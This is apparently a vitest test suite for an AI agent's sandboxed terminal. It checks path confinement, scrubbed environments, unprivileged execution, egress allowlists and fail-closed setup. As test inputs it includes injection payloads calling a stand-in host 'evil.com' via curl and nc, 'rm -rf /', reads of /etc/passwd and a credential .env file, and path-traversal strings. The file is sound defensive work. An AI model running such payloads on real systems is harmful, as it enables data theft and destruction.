/**
 * Virtual-terminal boundary tests.
 *
 * These cover the properties that actually contain the terminal: workspace path
 * confinement, the scrubbed environment, the unprivileged uid, and fail-closed
 * boundary setup. Command-string filtering is intentionally NOT tested because
 * it is intentionally not implemented — running arbitrary commands is the
 * feature, and the containment is structural.
 */
import { describe, it, expect, beforeEach, vi } from 'vitest';
import {
  DEFAULT_EGRESS_ALLOWLIST,
  PLATFORM_EGRESS_HOSTS,
  TerminalBoundaryError,
  WORKSPACE_EGRESS_HOSTS,
  WORKSPACE_ROOT,
  buildTerminalCommand,
  composeTerminalAllowlist,
  ensureTerminalBoundary,
  forgetTerminalBoundary,
  resolveWorkspacePath,
  shellQuote,
  truncateOutput,
  MAX_OUTPUT_CHARS,
  buildWorkspaceCommand,
  validateWorkspaceArgs,
} from '../src/lib/terminal';

describe('resolveWorkspacePath', () => {
  it('resolves relative paths under the workspace', () => {
    expect(resolveWorkspacePath('repo/src/main.ts')).toBe('/workspace/repo/src/main.ts');
    expect(resolveWorkspacePath('./repo')).toBe('/workspace/repo');
    expect(resolveWorkspacePath('repo//src///x.ts')).toBe('/workspace/repo/src/x.ts');
  });

  it('allows the workspace root itself', () => {
    expect(resolveWorkspacePath('/workspace')).toBe('/workspace');
  });

  it('normalizes interior .. that stays inside', () => {
    expect(resolveWorkspacePath('repo/src/../lib/x.ts')).toBe('/workspace/repo/lib/x.ts');
  });

  it('REJECTS traversal that escapes the workspace', () => {
    // The ordering bug this guards against: checking the raw string for ".."
    // and then normalizing. Normalization must come first.
    expect(() => resolveWorkspacePath('../etc/passwd')).toThrow(TerminalBoundaryError);
    expect(() => resolveWorkspacePath('repo/../../etc/passwd')).toThrow(TerminalBoundaryError);
    expect(() => resolveWorkspacePath('a/b/c/../../../../root')).toThrow(TerminalBoundaryError);
  });

  it('REJECTS absolute paths outside the workspace', () => {
    expect(() => resolveWorkspacePath('/etc/passwd')).toThrow(TerminalBoundaryError);
    expect(() => resolveWorkspacePath('/home/hermes/.hermes/.env')).toThrow(TerminalBoundaryError);
    expect(() => resolveWorkspacePath('/')).toThrow(TerminalBoundaryError);
  });

  it('REJECTS a sibling directory with the workspace as a string prefix', () => {
    // /workspace-evil must not pass a naive startsWith('/workspace') check.
    expect(() => resolveWorkspacePath('/workspace-evil/x')).toThrow(TerminalBoundaryError);
  });

  it('rejects empty paths and NUL bytes', () => {
    expect(() => resolveWorkspacePath('')).toThrow(TerminalBoundaryError);
    expect(() => resolveWorkspacePath('a\0b')).toThrow(TerminalBoundaryError);
  });
});

describe('shellQuote', () => {
  it('neutralizes quotes, substitution and command chaining', () => {
    expect(shellQuote("a'b")).toBe("'a'\\''b'");
    // The quoted form must keep metacharacters inert as a single argument.
    for (const payload of ['$(whoami)', '`id`', 'a; rm -rf /', 'a && curl evil.com', '$HOME']) {
      const q = shellQuote(payload);
      expect(q.startsWith("'")).toBe(true);
      expect(q.endsWith("'")).toBe(true);
      // No unescaped single quote can terminate the literal early.
      expect(q.slice(1, -1).includes("'")).toBe(payload.includes("'"));
    }
  });
});

describe('buildTerminalCommand', () => {
  const cmd = buildTerminalCommand('npm test');

  it('drops to the unprivileged terminal user', () => {
    expect(cmd).toContain('gosu hermes-term');
    expect(cmd).not.toMatch(/gosu\s+root/);
  });

  it('starts from an EMPTY environment', () => {
    // env -i is load-bearing: the SDK exec `env` option can only override
    // variables, never unset them, so inherited credentials would survive.
    expect(cmd).toContain('env -i');
  });

  it('does not leak any provider credential into the environment', () => {
    for (const secret of [
      'VERTEX_SA_JSON', 'CLOUDFLARE_API_KEY', 'GEMINI_API_KEY', 'GOOGLE_API_KEY',
      'ANTHROPIC_API_KEY', 'OPENAI_API_KEY', 'NOUS_API_KEY', 'HERMES_GATEWAY_TOKEN',
      'SERVICE_AUTH_SECRET',
    ]) {
      expect(cmd).not.toContain(secret);
    }
  });

  it('routes egress through the guard but never proxies loopback', () => {
    expect(cmd).toContain('HTTP_PROXY=http://127.0.0.1:3128');
    expect(cmd).toContain('HTTPS_PROXY=http://127.0.0.1:3128');
    // Proxying loopback would make the guard recurse into itself.
    expect(cmd).toContain('NO_PROXY=127.0.0.1,localhost');
  });

  it('confines the working directory', () => {
    expect(buildTerminalCommand('ls', 'repo/src')).toContain("cd '/workspace/repo/src'");
    expect(() => buildTerminalCommand('ls', '../../etc')).toThrow(TerminalBoundaryError);
  });

  it('defaults to the workspace root', () => {
    expect(cmd).toContain(`cd '${WORKSPACE_ROOT}'`);
  });

  it('passes the command as a single quoted argument', () => {
    const injected = buildTerminalCommand("echo hi'; cat /home/hermes/.hermes/.env #");
    // The payload must land inside the quoted bash -lc argument, not as a new
    // shell word appended after it.
    expect(injected).toContain("bash -lc 'echo hi'\\''; cat /home/hermes/.hermes/.env #'");
  });
});

describe('ensureTerminalBoundary', () => {
  beforeEach(() => forgetTerminalBoundary('agent-1'));

  it('runs the setup script with the allowlist and succeeds on exit 0', async () => {
    const exec = vi.fn(async () => ({ exitCode: 0, stdout: 'ok' }));
    await ensureTerminalBoundary({ exec }, 'agent-1', 'github.com');
    expect(exec).toHaveBeenCalledTimes(1);
    const invoked = exec.mock.calls[0][0] as unknown as string;
    expect(invoked).toContain('/usr/local/bin/setup-terminal.sh');
    expect(invoked).toContain("EGRESS_ALLOWED_HOSTS='github.com'");
  });

  it('memoizes per container so setup runs once per boot', async () => {
    const exec = vi.fn(async () => ({ exitCode: 0 }));
    await ensureTerminalBoundary({ exec }, 'agent-1', 'github.com');
    await ensureTerminalBoundary({ exec }, 'agent-1', 'github.com');
    expect(exec).toHaveBeenCalledTimes(1);
  });

  it('FAILS CLOSED when the lockdown cannot be established', async () => {
    // The critical property: a container whose iptables rules failed must not
    // serve terminal traffic. No degraded mode.
    const exec = vi.fn(async () => ({ exitCode: 1, stderr: 'iptables not available' }));
    await expect(ensureTerminalBoundary({ exec }, 'agent-1', 'github.com'))
      .rejects.toThrow(TerminalBoundaryError);
  });

  it('does not cache a failure, so a transient boot race is retryable', async () => {
    const exec = vi.fn()
      .mockResolvedValueOnce({ exitCode: 1, stderr: 'not ready' })
      .mockResolvedValueOnce({ exitCode: 0 });
    await expect(ensureTerminalBoundary({ exec }, 'agent-1', 'x.com')).rejects.toThrow();
    await expect(ensureTerminalBoundary({ exec }, 'agent-1', 'x.com')).resolves.toBeUndefined();
    expect(exec).toHaveBeenCalledTimes(2);
  });
});

describe('egress allowlist default', () => {
  it('contains registries and forges, and no wildcard', () => {
    expect(DEFAULT_EGRESS_ALLOWLIST).toContain('github.com');
    expect(DEFAULT_EGRESS_ALLOWLIST).toContain('registry.npmjs.org');
    expect(DEFAULT_EGRESS_ALLOWLIST).not.toContain('*');
  });
});

describe('composeTerminalAllowlist feature flags', () => {
  const base = 'github.com,registry.npmjs.org';

  it('defaults to base only (flags closed)', () => {
    const hosts = composeTerminalAllowlist({ base });
    expect(hosts).toBe(base);
    expect(hosts).not.toContain('api.cloudflare.com');
    expect(hosts).not.toContain('accounts.google.com');
  });

  it('falls back to DEFAULT when base is empty/undefined', () => {
    expect(composeTerminalAllowlist({})).toBe(DEFAULT_EGRESS_ALLOWLIST);
  });

  it('adds Workspace hosts when workspace CLI is enabled', () => {
    const hosts = composeTerminalAllowlist({ base, workspaceCliEnabled: true });
    expect(hosts).toContain('googleapis.com');
    expect(hosts).toContain(WORKSPACE_EGRESS_HOSTS.split(',')[0]);
    expect(hosts).not.toContain('api.cloudflare.com');
  });

  it('adds platform CLI hosts when platform CLI is enabled', () => {
    const hosts = composeTerminalAllowlist({ base, platformCliEnabled: true });
    expect(hosts).toContain('api.cloudflare.com');
    expect(hosts).toContain('accounts.google.com');
    expect(hosts).toContain('googleapis.com');
    // No wildcards — the guard rejects them.
    expect(PLATFORM_EGRESS_HOSTS).not.toContain('*');
    expect(hosts).not.toContain('*');
  });

  it('composes workspace + platform when both enabled', () => {
    const hosts = composeTerminalAllowlist({
      base,
      workspaceCliEnabled: true,
      platformCliEnabled: true,
    });
    expect(hosts).toContain('googleapis.com');
    expect(hosts).toContain('api.cloudflare.com');
    expect(hosts.startsWith(base)).toBe(true);
  });
});

describe('truncateOutput', () => {
  it('keeps the tail, where errors and test summaries live', () => {
    const long = `${'a'.repeat(MAX_OUTPUT_CHARS)}TAIL_MARKER`;
    const { text, truncated } = truncateOutput(long);
    expect(truncated).toBe(true);
    expect(text.endsWith('TAIL_MARKER')).toBe(true);
    expect(text.length).toBe(MAX_OUTPUT_CHARS);
  });

  it('passes short output through untouched', () => {
    expect(truncateOutput('hi')).toEqual({ text: 'hi', truncated: false });
    expect(truncateOutput(undefined)).toEqual({ text: '', truncated: false });
  });
});

describe('buildWorkspaceCommand (Google Workspace CLI)', () => {
  const TOKEN = 'ya29.a0AfB_byExampleToken';

  it('passes the OAuth token via the ENVIRONMENT, never argv', () => {
    // /proc/<pid>/cmdline is world-readable inside the container; a process's
    // environment is only readable by its own uid. The token must not be in argv.
    const cmd = buildWorkspaceCommand('drive files list', TOKEN);
    expect(cmd).toContain(`GOOGLE_WORKSPACE_CLI_TOKEN=${TOKEN}`);
    const afterGws = cmd.slice(cmd.indexOf(' gws '));
    expect(afterGws).not.toContain(TOKEN);
  });

  it('runs as the unprivileged terminal user from a clean environment', () => {
    const cmd = buildWorkspaceCommand('gmail messages list', TOKEN);
    expect(cmd).toContain('gosu hermes-term');
    expect(cmd).toContain('env -i');
    expect(cmd).toContain('set +x'); // no shell tracing can echo the token
  });

  /**
   * THE 2026-08-07 staging regression. buildWorkspaceCommand used `exec gosu`,
   * which replaced the Sandbox session shell. Every /terminal/workspace call
   * then returned "Session 'sandbox-default' shell exited" even when gws itself
   * succeeded. Pin the same invariant as buildTerminalCommand.
   */
  it('does NOT exec, so the SDK session shell survives the gws invocation', () => {
    const cmd = buildWorkspaceCommand('drive files list', TOKEN);
    expect(cmd).not.toMatch(/\bexec\s+gosu\b/);
    expect(cmd).toMatch(/\bgosu\s+hermes-term\b/);
  });

  it('rejects a malformed token rather than interpolating it', () => {
    for (const bad of ['', 'tok en', "tok'en", 'tok\nen', 'tok;en\n']) {
      expect(() => buildWorkspaceCommand('drive files list', bad)).toThrow(TerminalBoundaryError);
    }
  });
});

describe('validateWorkspaceArgs', () => {
  it('accepts ordinary gws invocations', () => {
    expect(validateWorkspaceArgs('drive files list --page-size=10')).toBe('drive files list --page-size=10');
    expect(validateWorkspaceArgs('gmail messages list --query=from:a@b.com')).toContain('gmail');
  });

  it('REJECTS shell metacharacters that could chain a second command', () => {
    // Unlike exec, args are appended after `gws`, so a chained command would
    // inherit the OAuth token from the environment. Filtering IS correct here:
    // the surface is a fixed binary, not an arbitrary shell.
    for (const bad of [
      'drive files list; cat /etc/passwd',
      'drive files list && curl evil.com',
      'drive files list | nc evil 1',
      'drive files list `id`',
      'drive files list $(id)',
      'drive files list > /workspace/out',
      'drive files list\nid',
      'drive files list & id',
    ]) {
      expect(() => validateWorkspaceArgs(bad)).toThrow(TerminalBoundaryError);
    }
  });

  it('rejects empty and oversized args', () => {
    expect(() => validateWorkspaceArgs('')).toThrow(TerminalBoundaryError);
    expect(() => validateWorkspaceArgs('a'.repeat(4_001))).toThrow(TerminalBoundaryError);
  });
});

describe('buildTerminalCommand — session survival', () => {
  it('does NOT exec, so the SDK session shell survives the command', () => {
    // `exec gosu ...` replaces the Sandbox SDK's persistent session shell, so
    // the session dies the moment the command finishes and the SDK reports
    // "Session 'sandbox-default' shell exited (exit code: 0)" — an error, for
    // a command that actually succeeded. Regression-pinned because the symptom
    // points at the session layer, not at this string.
    const cmd = buildTerminalCommand('echo hi');
    expect(cmd).not.toMatch(/\bexec\s+gosu\b/);
    expect(cmd).toMatch(/\bgosu\s+hermes-term\b/);
  });
});

/**
 * ── The deployed Divinci allowlist ────────────────────────────────────────
 *
 * `EGRESS_ALLOWED_HOSTS` in the wrangler configs REPLACES
 * DEFAULT_EGRESS_ALLOWLIST rather than extending it (composeTerminalAllowlist
 * uses it as `base`), so the deployed value has to carry the forges and
 * registries itself. An edit that adds a Divinci host by *overwriting* the
 * line would silently break every `git clone` and `npm install` in the
 * terminal, and nothing else would notice until a build failed.
 *
 * The two shape assertions below are the ones a well-meaning edit gets wrong.
 */
describe('deployed egress allowlists', () => {
  const { readFileSync } = require('node:fs') as typeof import('node:fs');
  const { join } = require('node:path') as typeof import('node:path');
  const hostsIn = (file: string): string[] => {
    const src = readFileSync(join(__dirname, '..', file), 'utf8');
    const line = src.split('\n').find((l) => l.startsWith('EGRESS_ALLOWED_HOSTS ='));
    if (!line) throw new Error(`${file}: no EGRESS_ALLOWED_HOSTS`);
    return line.split('=')[1].trim().replace(/^"|"$/g, '').split(',').map((h) => h.trim());
  };

  for (const file of ['wrangler.production.toml', 'wrangler.staging.toml']) {
    describe(file, () => {
      const hosts = hostsIn(file);

      it('still carries the build forges and registries', () => {
        for (const h of DEFAULT_EGRESS_ALLOWLIST.split(',')) expect(hosts).toContain(h);
      });

      it('lets a wake reach the API the fleet keeps asking about', () => {
        expect(hosts).toContain('api.divinci.app');
      });

      it('lets changelog duty reach Buffer MCP and the docs site', () => {
        expect(hosts).toContain('mcp.buffer.com');
        expect(hosts).toContain('sdk.divinci.ai');
      });

      it('covers every demo worker via the account subdomain', () => {
        // Suffix match — only our own account can deploy to it.
        expect(hosts).toContain('divinci-ai.workers.dev');
      });

      it('names the R2 bucket EXACTLY, never the shared r2.dev suffix', () => {
        // Dot-anchored `r2.dev` would admit every public R2 bucket on
        // Cloudflare, an attacker's included. This is the single most
        // tempting one-word "simplification" in the list.
        expect(hosts).not.toContain('r2.dev');
        expect(hosts.some((h) => h.endsWith('.r2.dev') && h.startsWith('pub-'))).toBe(true);
      });

      it('names divinci.app SUBDOMAINS, never the bare domain', () => {
        // `divinci.app` is dot-anchored too, so it would admit every future
        // subdomain — including connector-sync.divinci.app, a secret-gated
        // internal cron endpoint that no agent should be able to reach.
        expect(hosts).not.toContain('divinci.app');
        expect(hosts).not.toContain('divinci.ai');
      });

      it('contains no wildcard (the guard strips them, but say so here too)', () => {
        expect(hosts.some((h) => h.includes('*'))).toBe(false);
      });
    });
  }
});

/**
 * ── Both routes to the terminal must establish the boundary ───────────────
 *
 * The defect this guards: `ensureTerminalBoundary()` (Worker route) ran
 * setup-terminal.sh, but the agent reaches the terminal through
 * mcp-terminal-server.js, which spawns `sudo -u hermes-term hermes-term-exec`
 * directly in the container. That path never established the boundary, so in
 * production the egress lockdown was simply absent — `curl --noproxy "*"`
 * reached the internet, nothing listened on :3128, and OUTPUT had no rules.
 *
 * Nothing failed loudly, because the proxy env vars made it LOOK enforced.
 * These assertions exist so the two paths cannot silently diverge again.
 */
describe('terminal boundary is established on the container path too', () => {
  const { readFileSync } = require('node:fs') as typeof import('node:fs');
  const { join } = require('node:path') as typeof import('node:path');
  const startHermes = readFileSync(join(__dirname, '..', 'container/start-hermes.sh'), 'utf8');
  const setupScript = readFileSync(join(__dirname, '..', 'container/setup-terminal.sh'), 'utf8');

  it('boot runs setup-terminal.sh', () => {
    expect(startHermes).toMatch(/\/usr\/local\/bin\/setup-terminal\.sh/);
  });

  it('registers the MCP terminal ONLY when the boundary succeeded', () => {
    // The ordering IS the control: a failed boundary must yield no terminal,
    // never an unbounded one.
    expect(startHermes).toContain('TERMINAL_BOUNDARY_OK=false');
    expect(startHermes).toMatch(/\[ "\$TERMINAL_BOUNDARY_OK" = "true" \]/);
    const gate = startHermes.indexOf('TERMINAL_BOUNDARY_OK=true');
    const register = startHermes.indexOf('servers["divinci_terminal"]');
    expect(gate).toBeGreaterThan(-1);
    expect(register).toBeGreaterThan(gate);
  });

  it('says so loudly when the boundary fails', () => {
    // Losing the terminal silently would read as "the model stopped using it".
    expect(startHermes).toMatch(/terminal boundary FAILED/);
  });

  it('does not take the whole container down on failure', () => {
    // Same trade as the email guard: losing one tool beats losing Slack+chat.
    expect(startHermes).not.toMatch(/setup-terminal\.sh[^\n]*\|\|\s*exit 1/);
  });

  it('can clear a chain iptables itself refuses to touch', () => {
    // iptables-nft cannot represent every nftables chain; -F/-X then fail and
    // -N fails with "chain already exists", which is exactly the state found
    // in production. Without an nft fallback the boundary can never recover.
    expect(setupScript).toMatch(/nft delete chain ip filter HERMES_TERM/);
    expect(setupScript).toMatch(/nft delete chain inet filter HERMES_TERM/);
  });

  it('still fails closed if even the nft teardown cannot recover', () => {
    expect(setupScript).toMatch(/refusing to enable terminal/);
  });
});
